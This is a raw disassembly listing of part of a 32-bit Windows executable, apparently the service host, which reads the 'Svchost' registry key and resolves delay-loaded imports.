 10023b7:	89 43 08             	mov    %eax,0x8(%ebx)
 10023ba:	0f 84 d0 06 00 00    	je     0x1002a90
 10023c0:	5f                   	pop    %edi
 10023c1:	5e                   	pop    %esi
 10023c2:	8b c3                	mov    %ebx,%eax
 10023c4:	5b                   	pop    %ebx
 10023c5:	c9                   	leave
 10023c6:	c2 04 00             	ret    $0x4
 10023c9:	90                   	nop
 10023ca:	90                   	nop
 10023cb:	90                   	nop
 10023cc:	90                   	nop
 10023cd:	90                   	nop
 10023ce:	8b ff                	mov    %edi,%edi
 10023d0:	55                   	push   %ebp
 10023d1:	8b ec                	mov    %esp,%ebp
 10023d3:	51                   	push   %ecx
 10023d4:	53                   	push   %ebx
 10023d5:	8d 45 fc             	lea    -0x4(%ebp),%eax
 10023d8:	50                   	push   %eax
 10023d9:	68 19 00 02 00       	push   $0x20019
 10023de:	33 db                	xor    %ebx,%ebx
 10023e0:	53                   	push   %ebx
 10023e1:	68 50 24 00 01       	push   $0x1002450
 10023e6:	68 02 00 00 80       	push   $0x80000002
 10023eb:	ff 15 30 10 00 01    	call   *0x1001030
 10023f1:	3b c3                	cmp    %ebx,%eax
 10023f3:	0f 85 06 01 00 00    	jne    0x10024ff
 10023f9:	56                   	push   %esi
 10023fa:	ff 75 08             	push   0x8(%ebp)
 10023fd:	ff 75 fc             	push   -0x4(%ebp)
 1002400:	e8 a3 fb ff ff       	call   0x1001fa8
 1002405:	ff 75 fc             	push   -0x4(%ebp)
 1002408:	8b f0                	mov    %eax,%esi
 100240a:	ff 15 2c 10 00 01    	call   *0x100102c
 1002410:	3b f3                	cmp    %ebx,%esi
 1002412:	0f 85 e6 00 00 00    	jne    0x10024fe
 1002418:	57                   	push   %edi
 1002419:	68 20 40 00 01       	push   $0x1004020
 100241e:	ff 15 68 10 00 01    	call   *0x1001068
 1002424:	8b 35 94 40 00 01    	mov    0x1004094,%esi
 100242a:	8b 3d 48 10 00 01    	mov    0x1001048,%edi
 1002430:	89 1d 40 40 00 01    	mov    %ebx,0x1004040
 1002436:	66 39 1e             	cmp    %bx,(%esi)
 1002439:	74 7f                	je     0x10024ba
 100243b:	ff 05 40 40 00 01    	incl   0x1004040
 1002441:	56                   	push   %esi
 1002442:	ff d7                	call   *%edi
 1002444:	8d 74 46 02          	lea    0x2(%esi,%eax,2),%esi
 1002448:	eb ec                	jmp    0x1002436
 100244a:	90                   	nop
 100244b:	90                   	nop
 100244c:	90                   	nop
 100244d:	90                   	nop
 100244e:	90                   	nop
 100244f:	90                   	nop
 1002450:	53                   	push   %ebx
 1002451:	00 6f 00             	add    %ch,0x0(%edi)
 1002454:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
 1002459:	00 61 00             	add    %ah,0x0(%ecx)
 100245c:	72 00                	jb     0x100245e
 100245e:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
 1002463:	00 69 00             	add    %ch,0x0(%ecx)
 1002466:	63 00                	arpl   %eax,(%eax)
 1002468:	72 00                	jb     0x100246a
 100246a:	6f                   	outsl  %ds:(%esi),(%dx)
 100246b:	00 73 00             	add    %dh,0x0(%ebx)
 100246e:	6f                   	outsl  %ds:(%esi),(%dx)
 100246f:	00 66 00             	add    %ah,0x0(%esi)
 1002472:	74 00                	je     0x1002474
 1002474:	5c                   	pop    %esp
 1002475:	00 57 00             	add    %dl,0x0(%edi)
 1002478:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
 100247e:	6f                   	outsl  %ds:(%esi),(%dx)
 100247f:	00 77 00             	add    %dh,0x0(%edi)
 1002482:	73 00                	jae    0x1002484
 1002484:	20 00                	and    %al,(%eax)
 1002486:	4e                   	dec    %esi
 1002487:	00 54 00 5c          	add    %dl,0x5c(%eax,%eax,1)
 100248b:	00 43 00             	add    %al,0x0(%ebx)
 100248e:	75 00                	jne    0x1002490
 1002490:	72 00                	jb     0x1002492
 1002492:	72 00                	jb     0x1002494
 1002494:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
 1002498:	74 00                	je     0x100249a
 100249a:	56                   	push   %esi
 100249b:	00 65 00             	add    %ah,0x0(%ebp)
 100249e:	72 00                	jb     0x10024a0
 10024a0:	73 00                	jae    0x10024a2
 10024a2:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
 10024a8:	5c                   	pop    %esp
 10024a9:	00 53 00             	add    %dl,0x0(%ebx)
 10024ac:	76 00                	jbe    0x10024ae
 10024ae:	63 00                	arpl   %eax,(%eax)
 10024b0:	68 00 6f 00 73       	push   $0x73006f00
 10024b5:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
 10024b9:	00 a1 40 40 00 01    	add    %ah,0x1004040(%ecx)
 10024bf:	8d 04 80             	lea    (%eax,%eax,4),%eax
 10024c2:	c1 e0 02             	shl    $0x2,%eax
 10024c5:	50                   	push   %eax
 10024c6:	6a 08                	push   $0x8
 10024c8:	e8 e4 ed ff ff       	call   0x10012b1
 10024cd:	3b c3                	cmp    %ebx,%eax
 10024cf:	a3 38 40 00 01       	mov    %eax,0x1004038
 10024d4:	74 1c                	je     0x10024f2
 10024d6:	8b 35 94 40 00 01    	mov    0x1004094,%esi
 10024dc:	8b d8                	mov    %eax,%ebx
 10024de:	66 83 3e 00          	cmpw   $0x0,(%esi)
 10024e2:	74 0e                	je     0x10024f2
 10024e4:	89 33                	mov    %esi,(%ebx)
 10024e6:	56                   	push   %esi
 10024e7:	83 c3 14             	add    $0x14,%ebx
 10024ea:	ff d7                	call   *%edi
 10024ec:	8d 74 46 02          	lea    0x2(%esi,%eax,2),%esi
 10024f0:	eb ec                	jmp    0x10024de
 10024f2:	68 20 40 00 01       	push   $0x1004020
 10024f7:	ff 15 60 10 00 01    	call   *0x1001060
 10024fd:	5f                   	pop    %edi
 10024fe:	5e                   	pop    %esi
 10024ff:	5b                   	pop    %ebx
 1002500:	c9                   	leave
 1002501:	c2 04 00             	ret    $0x4
 1002504:	90                   	nop
 1002505:	90                   	nop
 1002506:	90                   	nop
 1002507:	90                   	nop
 1002508:	90                   	nop
 1002509:	e8 ee fc ff ff       	call   0x10021fc
 100250e:	8b ff                	mov    %edi,%edi
 1002510:	56                   	push   %esi
 1002511:	57                   	push   %edi
 1002512:	68 a2 2e 00 01       	push   $0x1002ea2
 1002517:	ff 15 89 54 00 01    	call   *0x1005489
 100251d:	6a 01                	push   $0x1
 100251f:	ff 15 90 10 00 01    	call   *0x1001090
 1002525:	ff 15 8c 10 00 01    	call   *0x100108c
 100252b:	50                   	push   %eax
 100252c:	e8 61 fa ff ff       	call   0x1001f92
 1002531:	b8 48 40 00 01       	mov    $0x1004048,%eax
 1002536:	68 20 40 00 01       	push   $0x1004020
 100253b:	a3 4c 40 00 01       	mov    %eax,0x100404c
 1002540:	a3 48 40 00 01       	mov    %eax,0x1004048
 1002545:	ff 15 88 10 00 01    	call   *0x1001088
 100254b:	ff 15 20 54 00 01    	call   *0x1005420
 1002551:	50                   	push   %eax
 1002552:	e8 5a fd ff ff       	call   0x10022b1
 1002557:	8b f0                	mov    %eax,%esi
 1002559:	85 f6                	test   %esi,%esi
 100255b:	74 28                	je     0x1002585
 100255d:	56                   	push   %esi
 100255e:	e8 6b fe ff ff       	call   0x10023ce
 1002563:	e8 2d fc ff ff       	call   0x1002195
 1002568:	8b f8                	mov    %eax,%edi
 100256a:	85 ff                	test   %edi,%edi
 100256c:	74 06                	je     0x1002574
 100256e:	56                   	push   %esi
 100256f:	e8 1e 00 00 00       	call   0x1002592
 1002574:	56                   	push   %esi
 1002575:	e8 3c f3 ff ff       	call   0x10018b6
 100257a:	85 ff                	test   %edi,%edi
 100257c:	74 07                	je     0x1002585
 100257e:	57                   	push   %edi
 100257f:	ff 15 34 10 00 01    	call   *0x1001034
 1002585:	6a 00                	push   $0x0
 1002587:	ff 15 80 10 00 01    	call   *0x1001080
 100258d:	90                   	nop
 100258e:	90                   	nop
 100258f:	90                   	nop
 1002590:	90                   	nop
 1002591:	90                   	nop
 1002592:	8b ff                	mov    %edi,%edi
 1002594:	55                   	push   %ebp
 1002595:	8b ec                	mov    %esp,%ebp
 1002597:	56                   	push   %esi
 1002598:	8b 75 08             	mov    0x8(%ebp),%esi
 100259b:	8b 46 10             	mov    0x10(%esi),%eax
 100259e:	85 c0                	test   %eax,%eax
 10025a0:	74 0f                	je     0x10025b1
 10025a2:	ff 76 1c             	push   0x1c(%esi)
 10025a5:	ff 76 18             	push   0x18(%esi)
 10025a8:	ff 76 14             	push   0x14(%esi)
 10025ab:	50                   	push   %eax
 10025ac:	e8 66 01 00 00       	call   0x1002717
 10025b1:	8b 76 20             	mov    0x20(%esi),%esi
 10025b4:	85 f6                	test   %esi,%esi
 10025b6:	0f 85 ab 03 00 00    	jne    0x1002967
 10025bc:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
 10025c2:	8b 40 30             	mov    0x30(%eax),%eax
 10025c5:	ff 70 08             	push   0x8(%eax)
 10025c8:	ff 15 10 11 00 01    	call   *0x1001110
 10025ce:	85 c0                	test   %eax,%eax
 10025d0:	74 09                	je     0x10025db
 10025d2:	ff 70 64             	push   0x64(%eax)
 10025d5:	ff 15 2c 11 00 01    	call   *0x100112c
 10025db:	5e                   	pop    %esi
 10025dc:	5d                   	pop    %ebp
 10025dd:	c2 04 00             	ret    $0x4
 10025e0:	90                   	nop
 10025e1:	90                   	nop
 10025e2:	90                   	nop
 10025e3:	90                   	nop
 10025e4:	90                   	nop
 10025e5:	b8 08 40 00 01       	mov    $0x1004008,%eax
 10025ea:	eb 4d                	jmp    0x1002639
 10025ec:	90                   	nop
 10025ed:	90                   	nop
 10025ee:	90                   	nop
 10025ef:	90                   	nop
 10025f0:	90                   	nop
 10025f1:	8b ff                	mov    %edi,%edi
 10025f3:	55                   	push   %ebp
 10025f4:	8b ec                	mov    %esp,%ebp
 10025f6:	51                   	push   %ecx
 10025f7:	57                   	push   %edi
 10025f8:	8b 7d 10             	mov    0x10(%ebp),%edi
 10025fb:	8d 45 fc             	lea    -0x4(%ebp),%eax
 10025fe:	50                   	push   %eax
 10025ff:	57                   	push   %edi
 1002600:	8d 45 10             	lea    0x10(%ebp),%eax
 1002603:	50                   	push   %eax
 1002604:	6a 00                	push   $0x0
 1002606:	ff 75 0c             	push   0xc(%ebp)
 1002609:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
 1002610:	ff 75 08             	push   0x8(%ebp)
 1002613:	ff 15 00 10 00 01    	call   *0x1001000
 1002619:	85 c0                	test   %eax,%eax
 100261b:	74 05                	je     0x1002622
 100261d:	5f                   	pop    %edi
 100261e:	c9                   	leave
 100261f:	c2 0c 00             	ret    $0xc
 1002622:	83 7d 10 04          	cmpl   $0x4,0x10(%ebp)
 1002626:	74 f5                	je     0x100261d
 1002628:	e9 43 03 00 00       	jmp    0x1002970
 100262d:	90                   	nop
 100262e:	90                   	nop
 100262f:	90                   	nop
 1002630:	90                   	nop
 1002631:	90                   	nop
 1002632:	b8 0c 40 00 01       	mov    $0x100400c,%eax
 1002637:	eb 00                	jmp    0x1002639
 1002639:	51                   	push   %ecx
 100263a:	52                   	push   %edx
 100263b:	50                   	push   %eax
 100263c:	68 88 32 00 01       	push   $0x1003288
 1002641:	e8 09 00 00 00       	call   0x100264f
 1002646:	5a                   	pop    %edx
 1002647:	59                   	pop    %ecx
 1002648:	ff e0                	jmp    *%eax
 100264a:	90                   	nop
 100264b:	90                   	nop
 100264c:	90                   	nop
 100264d:	90                   	nop
 100264e:	90                   	nop
 100264f:	8b ff                	mov    %edi,%edi
 1002651:	55                   	push   %ebp
 1002652:	8b ec                	mov    %esp,%ebp
 1002654:	83 ec 28             	sub    $0x28,%esp
 1002657:	8b 45 08             	mov    0x8(%ebp),%eax
 100265a:	53                   	push   %ebx
 100265b:	8b 58 04             	mov    0x4(%eax),%ebx
 100265e:	56                   	push   %esi
 100265f:	8b 70 08             	mov    0x8(%eax),%esi
 1002662:	57                   	push   %edi
 1002663:	8b 7d 0c             	mov    0xc(%ebp),%edi
 1002666:	2b 78 0c             	sub    0xc(%eax),%edi
 1002669:	8b 40 10             	mov    0x10(%eax),%eax
 100266c:	b9 00 00 00 01       	mov    $0x1000000,%ecx
 1002671:	2b f9                	sub    %ecx,%edi
 1002673:	c1 ff 02             	sar    $0x2,%edi
 1002676:	03 f1                	add    %ecx,%esi
 1002678:	8b 16                	mov    (%esi),%edx
 100267a:	03 d9                	add    %ecx,%ebx
 100267c:	8d 84 b8 00 00 00 01 	lea    0x1000000(%eax,%edi,4),%eax
 1002683:	8b 08                	mov    (%eax),%ecx
 1002685:	85 c9                	test   %ecx,%ecx
 1002687:	78 79                	js     0x1002702
 1002689:	8d 81 02 00 00 01    	lea    0x1000002(%ecx),%eax
 100268f:	85 d2                	test   %edx,%edx
 1002691:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1002694:	75 52                	jne    0x10026e8
 1002696:	53                   	push   %ebx
 1002697:	ff 15 a0 10 00 01    	call   *0x10010a0
 100269d:	8b f8                	mov    %eax,%edi
 100269f:	85 ff                	test   %edi,%edi
 10026a1:	89 7d 08             	mov    %edi,0x8(%ebp)
 10026a4:	74 61                	je     0x1002707
 10026a6:	6a 00                	push   $0x0
 10026a8:	57                   	push   %edi
 10026a9:	56                   	push   %esi
 10026aa:	ff 15 9c 10 00 01    	call   *0x100109c
 10026b0:	8b f0                	mov    %eax,%esi
 10026b2:	85 f6                	test   %esi,%esi
 10026b4:	0f 85 11 04 00 00    	jne    0x1002acb
 10026ba:	6a 08                	push   $0x8
 10026bc:	59                   	pop    %ecx
 10026bd:	8d 7d dc             	lea    -0x24(%ebp),%edi
 10026c0:	f3 ab                	rep stos %eax,%es:(%edi)
 10026c2:	8b 45 08             	mov    0x8(%ebp),%eax
 10026c5:	89 45 f0             	mov    %eax,-0x10(%ebp)
 10026c8:	a1 9c 40 00 01       	mov    0x100409c,%eax
 10026cd:	85 c0                	test   %eax,%eax
 10026cf:	c7 45 d8 24 00 00 00 	movl   $0x24,-0x28(%ebp)
 10026d6:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
 10026d9:	0f 85 df 03 00 00    	jne    0x1002abe
 10026df:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
 10026e3:	74 22                	je     0x1002707
 10026e5:	8b 55 08             	mov    0x8(%ebp),%edx
 10026e8:	ff 75 fc             	push   -0x4(%ebp)
 10026eb:	52                   	push   %edx
 10026ec:	ff 15 58 10 00 01    	call   *0x1001058
 10026f2:	85 c0                	test   %eax,%eax
 10026f4:	74 11                	je     0x1002707
 10026f6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 10026f9:	5f                   	pop    %edi
 10026fa:	5e                   	pop    %esi
 10026fb:	89 01                	mov    %eax,(%ecx)
 10026fd:	5b                   	pop    %ebx
 10026fe:	c9                   	leave
 10026ff:	c2 08 00             	ret    $0x8
 1002702:	0f b7 00             	movzwl (%eax),%eax
 1002705:	eb 88                	jmp    0x100268f
 1002707:	ff 75 fc             	push   -0x4(%ebp)
 100270a:	53                   	push   %ebx
 100270b:	e8 87 0a 00 00       	call   0x1003197
 1002710:	eb e4                	jmp    0x10026f6
 1002712:	90                   	nop
 1002713:	90                   	nop
 1002714:	90                   	nop
 1002715:	90                   	nop
 1002716:	90                   	nop
 1002717:	8b ff                	mov    %edi,%edi
 1002719:	55                   	push   %ebp
 100271a:	8b ec                	mov    %esp,%ebp
 100271c:	51                   	push   %ecx
 100271d:	51                   	push   %ecx
 100271e:	8d 45 f8             	lea    -0x8(%ebp),%eax
 1002721:	50                   	push   %eax
 1002722:	8d 45 fc             	lea    -0x4(%ebp),%eax
 1002725:	50                   	push   %eax
 1002726:	e8 47 00 00 00       	call   0x1002772
 100272b:	85 c0                	test   %eax,%eax
 100272d:	75 3a                	jne    0x1002769
 100272f:	56                   	push   %esi
 1002730:	6a 04                	push   $0x4
 1002732:	33 f6                	xor    %esi,%esi
 1002734:	56                   	push   %esi
 1002735:	ff 15 08 40 00 01    	call   *0x1004008
 100273b:	85 c0                	test   %eax,%eax
 100273d:	7c 18                	jl     0x1002757
 100273f:	56                   	push   %esi
 1002740:	ff 75 14             	push   0x14(%ebp)
 1002743:	56                   	push   %esi
 1002744:	ff 75 10             	push   0x10(%ebp)
 1002747:	ff 75 0c             	push   0xc(%ebp)
 100274a:	56                   	push   %esi
 100274b:	56                   	push   %esi
 100274c:	6a ff                	push   $0xffffffff
 100274e:	ff 75 fc             	push   -0x4(%ebp)
 1002751:	ff 15 0c 40 00 01    	call   *0x100400c
 1002757:	ff 75 fc             	push   -0x4(%ebp)
 100275a:	e8 57 f1 ff ff       	call   0x10018b6
 100275f:	ff 75 f8             	push   -0x8(%ebp)
 1002762:	ff 15 4c 10 00 01    	call   *0x100104c
 1002768:	5e                   	pop    %esi
 1002769:	c9                   	leave
 100276a:	c2 10 00             	ret    $0x10
 100276d:	90                   	nop
 100276e:	90                   	nop
 100276f:	90                   	nop
 1002770:	90                   	nop
 1002771:	90                   	nop
 1002772:	8b ff                	mov    %edi,%edi
 1002774:	55                   	push   %ebp
 1002775:	8b ec                	mov    %esp,%ebp
 1002777:	83 ec 3c             	sub    $0x3c,%esp
 100277a:	8b 45 08             	mov    0x8(%ebp),%eax
 100277d:	53                   	push   %ebx
 100277e:	33 db                	xor    %ebx,%ebx
 1002780:	89 18                	mov    %ebx,(%eax)
 1002782:	8b 45 0c             	mov    0xc(%ebp),%eax
 1002785:	57                   	push   %edi
 1002786:	89 18                	mov    %ebx,(%eax)
 1002788:	8d 45 f8             	lea    -0x8(%ebp),%eax
 100278b:	50                   	push   %eax
 100278c:	53                   	push   %ebx
 100278d:	6a 08                	push   $0x8
 100278f:	89 5d f0             	mov    %ebx,-0x10(%ebp)
 1002792:	ff 15 54 10 00 01    	call   *0x1001054
 1002798:	50                   	push   %eax
 1002799:	ff 15 20 10 00 01    	call   *0x1001020
 100279f:	85 c0                	test   %eax,%eax
 10027a1:	75 1b                	jne    0x10027be
 10027a3:	8d 45 f8             	lea    -0x8(%ebp),%eax
 10027a6:	50                   	push   %eax
 10027a7:	6a 08                	push   $0x8
 10027a9:	ff 15 50 10 00 01    	call   *0x1001050
 10027af:	50                   	push   %eax
 10027b0:	ff 15 1c 10 00 01    	call   *0x100101c
 10027b6:	85 c0                	test   %eax,%eax
 10027b8:	0f 84 d4 01 00 00    	je     0x1002992
 10027be:	56                   	push   %esi
 10027bf:	8b 35 18 10 00 01    	mov    0x1001018,%esi
 10027c5:	8d 45 ec             	lea    -0x14(%ebp),%eax
 10027c8:	50                   	push   %eax
 10027c9:	53                   	push   %ebx
 10027ca:	53                   	push   %ebx
 10027cb:	6a 01                	push   $0x1
 10027cd:	ff 75 f8             	push   -0x8(%ebp)
 10027d0:	ff d6                	call   *%esi
 10027d2:	85 c0                	test   %eax,%eax
 10027d4:	75 12                	jne    0x10027e8
 10027d6:	ff 15 40 10 00 01    	call   *0x1001040
 10027dc:	83 f8 7a             	cmp    $0x7a,%eax
 10027df:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10027e2:	0f 85 34 01 00 00    	jne    0x100291c
 10027e8:	8d 45 e8             	lea    -0x18(%ebp),%eax
 10027eb:	50                   	push   %eax
 10027ec:	53                   	push   %ebx
 10027ed:	53                   	push   %ebx
 10027ee:	6a 05                	push   $0x5
 10027f0:	ff 75 f8             	push   -0x8(%ebp)
 10027f3:	ff d6                	call   *%esi
 10027f5:	85 c0                	test   %eax,%eax
 10027f7:	75 12                	jne    0x100280b
 10027f9:	ff 15 40 10 00 01    	call   *0x1001040
 10027ff:	83 f8 7a             	cmp    $0x7a,%eax
 1002802:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1002805:	0f 85 11 01 00 00    	jne    0x100291c
 100280b:	8b 75 ec             	mov    -0x14(%ebp),%esi
 100280e:	8b 45 e8             	mov    -0x18(%ebp),%eax
 1002811:	83 c6 03             	add    $0x3,%esi
 1002814:	83 e6 fc             	and    $0xfffffffc,%esi
 1002817:	8d 44 06 14          	lea    0x14(%esi,%eax,1),%eax
 100281b:	50                   	push   %eax
 100281c:	53                   	push   %ebx
 100281d:	e8 8f ea ff ff       	call   0x10012b1
 1002822:	3b c3                	cmp    %ebx,%eax
 1002824:	89 45 f4             	mov    %eax,-0xc(%ebp)
 1002827:	0f 84 03 01 00 00    	je     0x1002930
 100282d:	8d 78 14             	lea    0x14(%eax),%edi
 1002830:	6a 01                	push   $0x1
 1002832:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
 1002835:	50                   	push   %eax
 1002836:	89 5d fc             	mov    %ebx,-0x4(%ebp)
 1002839:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
 100283c:	ff 15 14 10 00 01    	call   *0x1001014
 1002842:	85 c0                	test   %eax,%eax
 1002844:	8b 35 40 10 00 01    	mov    0x1001040,%esi
 100284a:	0f 84 4d 01 00 00    	je     0x100299d
 1002850:	8d 45 ec             	lea    -0x14(%ebp),%eax
 1002853:	50                   	push   %eax
 1002854:	ff 75 ec             	push   -0x14(%ebp)
 1002857:	57                   	push   %edi
 1002858:	6a 01                	push   $0x1
 100285a:	ff 75 f8             	push   -0x8(%ebp)
 100285d:	ff 15 18 10 00 01    	call   *0x1001018
 1002863:	85 c0                	test   %eax,%eax
 1002865:	0f 84 3c 01 00 00    	je     0x10029a7
 100286b:	8d 45 e8             	lea    -0x18(%ebp),%eax
 100286e:	50                   	push   %eax
 100286f:	ff 75 e8             	push   -0x18(%ebp)
 1002872:	ff 75 e4             	push   -0x1c(%ebp)
 1002875:	6a 05                	push   $0x5
 1002877:	ff 75 f8             	push   -0x8(%ebp)
 100287a:	ff 15 18 10 00 01    	call   *0x1001018
 1002880:	85 c0                	test   %eax,%eax
 1002882:	0f 84 29 01 00 00    	je     0x10029b1
 1002888:	53                   	push   %ebx
 1002889:	ff 37                	push   (%edi)
 100288b:	ff 75 f4             	push   -0xc(%ebp)
 100288e:	ff 15 10 10 00 01    	call   *0x1001010
 1002894:	85 c0                	test   %eax,%eax
 1002896:	0f 84 1f 01 00 00    	je     0x10029bb
 100289c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
 100289f:	53                   	push   %ebx
 10028a0:	ff 30                	push   (%eax)
 10028a2:	ff 75 f4             	push   -0xc(%ebp)
 10028a5:	ff 15 0c 10 00 01    	call   *0x100100c
 10028ab:	85 c0                	test   %eax,%eax
 10028ad:	0f 84 12 01 00 00    	je     0x10029c5
 10028b3:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
 10028b6:	75 6e                	jne    0x1002926
 10028b8:	6a 02                	push   $0x2
 10028ba:	58                   	pop    %eax
 10028bb:	89 45 c8             	mov    %eax,-0x38(%ebp)
 10028be:	89 45 dc             	mov    %eax,-0x24(%ebp)
 10028c1:	8d 45 f0             	lea    -0x10(%ebp),%eax
 10028c4:	50                   	push   %eax
 10028c5:	53                   	push   %ebx
 10028c6:	8d 45 c4             	lea    -0x3c(%ebp),%eax
 10028c9:	33 ff                	xor    %edi,%edi
 10028cb:	47                   	inc    %edi
 10028cc:	50                   	push   %eax
 10028cd:	57                   	push   %edi
 10028ce:	89 7d c4             	mov    %edi,-0x3c(%ebp)
 10028d1:	89 5d cc             	mov    %ebx,-0x34(%ebp)
 10028d4:	89 5d d0             	mov    %ebx,-0x30(%ebp)
 10028d7:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
 10028da:	89 5d d8             	mov    %ebx,-0x28(%ebp)
 10028dd:	c7 45 e0 3c 29 00 01 	movl   $0x100293c,-0x20(%ebp)
 10028e4:	ff 15 08 10 00 01    	call   *0x1001008
 10028ea:	3b c3                	cmp    %ebx,%eax
 10028ec:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10028ef:	75 35                	jne    0x1002926
 10028f1:	53                   	push   %ebx
 10028f2:	ff 75 f0             	push   -0x10(%ebp)
 10028f5:	57                   	push   %edi
 10028f6:	ff 75 f4             	push   -0xc(%ebp)
 10028f9:	ff 15 04 10 00 01    	call   *0x1001004
 10028ff:	85 c0                	test   %eax,%eax
 1002901:	0f 84 c8 00 00 00    	je     0x10029cf
 1002907:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
 100290a:	75 1a                	jne    0x1002926
 100290c:	8b 45 08             	mov    0x8(%ebp),%eax
 100290f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
 1002912:	89 08                	mov    %ecx,(%eax)
 1002914:	8b 45 f0             	mov    -0x10(%ebp),%eax
 1002917:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 100291a:	89 01                	mov    %eax,(%ecx)
 100291c:	5e                   	pop    %esi
 100291d:	8b 45 fc             	mov    -0x4(%ebp),%eax
 1002920:	5f                   	pop    %edi
 1002921:	5b                   	pop    %ebx
 1002922:	c9                   	leave
 1002923:	c2 08 00             	ret    $0x8
 1002926:	ff 75 f4             	push   -0xc(%ebp)
 1002929:	e8 88 ef ff ff       	call   0x10018b6
 100292e:	eb ec                	jmp    0x100291c
 1002930:	c7 45 fc 0e 00 00 00 	movl   $0xe,-0x4(%ebp)
 1002937:	eb e3                	jmp    0x100291c
 1002939:	90                   	nop
 100293a:	90                   	nop
 100293b:	90                   	nop
 100293c:	01 01                	add    %eax,(%ecx)
 100293e:	00 00                	add    %al,(%eax)
 1002940:	00 00                	add    %al,(%eax)
 1002942:	00 05 0b 00 00 00    	add    %al,0xb
 1002948:	c7 46 1c 00 30 00 00 	movl   $0x3000,0x1c(%esi)
 100294f:	e9 2b f7 ff ff       	jmp    0x100207f
 1002954:	6a 0d                	push   $0xd
 1002956:	5b                   	pop    %ebx
 1002957:	e9 84 f6 ff ff       	jmp    0x1001fe0
 100295c:	8b 45 08             	mov    0x8(%ebp),%eax
 100295f:	89 46 20             	mov    %eax,0x20(%esi)
 1002962:	e9 31 f7 ff ff       	jmp    0x1002098
 1002967:	c1 e6 0a             	shl    $0xa,%esi
 100296a:	56                   	push   %esi
 100296b:	e9 65 fc ff ff       	jmp    0x10025d5
 1002970:	21 07                	and    %eax,(%edi)
 1002972:	b8 0c 07 00 00       	mov    $0x70c,%eax
 1002977:	e9 a1 fc ff ff       	jmp    0x100261d
 100297c:	ff 75 08             	push   0x8(%ebp)
 100297f:	e8 32 ef ff ff       	call   0x10018b6
 1002984:	ff 15 40 10 00 01    	call   *0x1001040
 100298a:	89 45 0c             	mov    %eax,0xc(%ebp)
 100298d:	e9 9b ef ff ff       	jmp    0x100192d
 1002992:	ff 15 40 10 00 01    	call   *0x1001040
 1002998:	89 45 fc             	mov    %eax,-0x4(%ebp)
 100299b:	eb 80                	jmp    0x100291d
 100299d:	ff d6                	call   *%esi
 100299f:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10029a2:	e9 a9 fe ff ff       	jmp    0x1002850
 10029a7:	ff d6                	call   *%esi
 10029a9:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10029ac:	e9 ba fe ff ff       	jmp    0x100286b
 10029b1:	ff d6                	call   *%esi
 10029b3:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10029b6:	e9 cd fe ff ff       	jmp    0x1002888
 10029bb:	ff d6                	call   *%esi
 10029bd:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10029c0:	e9 d7 fe ff ff       	jmp    0x100289c
 10029c5:	ff d6                	call   *%esi
 10029c7:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10029ca:	e9 e4 fe ff ff       	jmp    0x10028b3
 10029cf:	ff 75 f0             	push   -0x10(%ebp)
 10029d2:	ff 15 4c 10 00 01    	call   *0x100104c
 10029d8:	ff d6                	call   *%esi
 10029da:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10029dd:	e9 25 ff ff ff       	jmp    0x1002907
 10029e2:	ff 15 40 10 00 01    	call   *0x1001040
 10029e8:	89 06                	mov    %eax,(%esi)
 10029ea:	e9 cc ea ff ff       	jmp    0x10014bb
 10029ef:	8b 75 10             	mov    0x10(%ebp),%esi
 10029f2:	85 f6                	test   %esi,%esi
 10029f4:	74 08                	je     0x10029fe
 10029f6:	ff 15 40 10 00 01    	call   *0x1001040
 10029fc:	89 06                	mov    %eax,(%esi)
 10029fe:	33 c0                	xor    %eax,%eax
 1002a00:	e9 b9 ea ff ff       	jmp    0x10014be
 1002a05:	8b 45 08             	mov    0x8(%ebp),%eax
 1002a08:	89 46 14             	mov    %eax,0x14(%esi)
 1002a0b:	e9 30 f6 ff ff       	jmp    0x1002040
 1002a10:	8b 45 08             	mov    0x8(%ebp),%eax
 1002a13:	89 46 18             	mov    %eax,0x18(%esi)
 1002a16:	e9 45 f6 ff ff       	jmp    0x1002060
 1002a1b:	8b 46 04             	mov    0x4(%esi),%eax
 1002a1e:	ff 70 08             	push   0x8(%eax)
 1002a21:	ff 15 70 10 00 01    	call   *0x1001070
 1002a27:	8b 46 04             	mov    0x4(%esi),%eax
 1002a2a:	89 58 08             	mov    %ebx,0x8(%eax)
 1002a2d:	e9 4e ed ff ff       	jmp    0x1001780
 1002a32:	3b fb                	cmp    %ebx,%edi
 1002a34:	0f 84 92 e7 ff ff    	je     0x10011cc
 1002a3a:	ff 75 f0             	push   -0x10(%ebp)
 1002a3d:	57                   	push   %edi
 1002a3e:	e8 0f 04 00 00       	call   0x1002e52
 1002a43:	e9 84 e7 ff ff       	jmp    0x10011cc
 1002a48:	ff 75 f0             	push   -0x10(%ebp)
 1002a4b:	57                   	push   %edi
 1002a4c:	e8 01 04 00 00       	call   0x1002e52
 1002a51:	e9 7c e7 ff ff       	jmp    0x10011d2
 1002a56:	33 c0                	xor    %eax,%eax
 1002a58:	e9 68 f9 ff ff       	jmp    0x10023c5
 1002a5d:	46                   	inc    %esi
